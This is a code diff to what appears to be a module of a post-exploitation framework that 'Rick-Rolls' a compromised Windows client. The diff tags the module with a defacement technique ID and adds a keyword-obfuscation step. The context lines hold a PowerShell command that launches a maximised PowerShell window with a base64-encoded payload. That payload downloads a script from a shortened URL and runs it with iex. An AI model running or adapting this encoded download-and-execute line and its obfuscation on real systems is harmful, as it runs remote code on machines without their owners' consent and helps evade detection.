@@ -1,5 +1,7 @@
 from builtins import object
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -14,7 +16,7 @@ class Module(object):
 
             'Software': '',
 
-            'Techniques': [''],
+            'Techniques': ['T1491'],
 
             'Background' : False,
 
@@ -59,6 +61,10 @@ class Module(object):
  
         # iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
         script = "$Null = Start-Process -WindowStyle Maximized -FilePath \"C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe\" -ArgumentList \"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA\"; 'Client Rick-Asciied!'"
+
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
         return script
+
